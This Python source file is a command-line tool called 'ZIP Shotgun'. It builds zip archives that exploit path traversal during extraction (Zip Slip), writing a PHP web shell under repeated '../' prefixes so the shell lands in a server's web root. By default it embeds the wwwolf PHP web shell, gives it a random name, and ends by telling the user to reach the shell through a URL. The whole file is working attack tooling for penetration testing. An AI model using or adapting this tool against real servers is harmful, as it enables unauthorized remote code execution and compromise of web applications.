import logging
import string
from random import SystemRandom
from zipfile import ZipFile, ZIP_DEFLATED

import click

from zip_shotgun.shells.wwwolf_php_webshell import get_wwwolf_php_webshell_code
from zip_shotgun.utils.logging_config import configure_logging

CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])
APP_NAME = 'ZIP Shotgun'
VERSION = '1.0.0'

HELP_MSG_DIRECTORIES_COUNT = 'Count of how many directories to go back inside the zip file (e.g 3 means that 3 files will be added to the zip: ' \
                             'shell.php, ../shell.php and ../../shell.php where shell.php is the name of the shell you provided or randomly generated value'
HELP_MSG_SHELL_NAME = 'Name of the shell inside the generated zip file (e.g shell.php). If not provided it will be randomly generated'
HELP_MSG_SHELL_FILE_PATH = 'A file that contains code for the shell. If this option is not provided ' \
                           'wwwolf (https://github.com/WhiteWinterWolf/wwwolf-php-webshell) php shell will be added instead. ' \
                           'If name is provided it will be added to the zip with the provided name or if not provided the name will be randomly generated.'
HELP_MSG_COMPRESS = 'Enable compression. If this flag is set archive will be compressed using DEFALTE algorithm with compression level of 9. ' \
                    'By default there is no compression applied.'

RANDOM_SHELL_NAME_LENGTH = 15


@click.command(context_settings=CONTEXT_SETTINGS)
@click.version_option(version=VERSION, prog_name=APP_NAME)
@click.argument('output_zip_file', type=click.Path(writable=True, resolve_path=True))
@click.option('-c', '--directories-count', show_default=True, default=15, required=False, type=int, help=HELP_MSG_DIRECTORIES_COUNT)
@click.option('-n', '--shell-name', show_default=False, default=None, required=False, type=str, help=HELP_MSG_SHELL_NAME)
@click.option('-f', '--shell-file-path', show_default=False, default=None, required=False, type=click.Path(exists=True, resolve_path=True),
              help=HELP_MSG_SHELL_FILE_PATH)
@click.option('--compress', is_flag=True, help=HELP_MSG_COMPRESS)
def zip_shotgun_cli(output_zip_file, directories_count, shell_name, shell_file_path, compress):
    logging.info('Opening output zip file: {}'.format(output_zip_file))
    with ZipFile(output_zip_file, 'w') as output_zip:
        if shell_name is None:  # Shell name was not provided. Generate random name from ASCII letters and digits
            shell_name = '{}.php'.format(generate_random_name(RANDOM_SHELL_NAME_LENGTH))
            logging.info('Shell name was not provided. Generated random shell name: {}'.format(shell_name))

        if shell_file_path is None:  # Shell file was not provided. Using wwwolf's php webshell
            logging.info('Shell file was not provided. Using wwwolf\'s webshell')
            shell_code = get_wwwolf_php_webshell_code()
        else:
            logging.info('File containing shell code was provided. Content will be added to archive'.format(shell_file_path))
            logging.info('Opening provided file with shell code: {}'.format(shell_file_path))
            with open(shell_file_path) as provided_shell_file:
                shell_code = provided_shell_file.read()
                # TODO Save file extension to use later

        if compress:
            logging.info('--compress flag was set. Archive will be compressed using DEFLATE algorithm with a level of 9')
        else:
            logging.info('--compress flag was NOT set. Archive will be uncompressed')

        for i in range(directories_count):
            base_directory = '../' * i  # if iteration is 0 it will return empty string
            file_in_archive_name = '{}{}'.format(base_directory, shell_name)
            logging.info('Writing file: {} to the archive'.format(file_in_archive_name))
            if compress:
                output_zip.writestr(file_in_archive_name, shell_code, ZIP_DEFLATED, 9)
            else:
                output_zip.writestr(file_in_archive_name, shell_code)

    logging.info('Finished. Try to access shell using {} in the URL'.format(shell_name))


def generate_random_name(name_length: int):
    random_shell_name = ''.join(SystemRandom().choices(string.ascii_letters + string.digits, k=name_length))
    return random_shell_name


if __name__ == '__main__':
    configure_logging()
    zip_shotgun_cli()
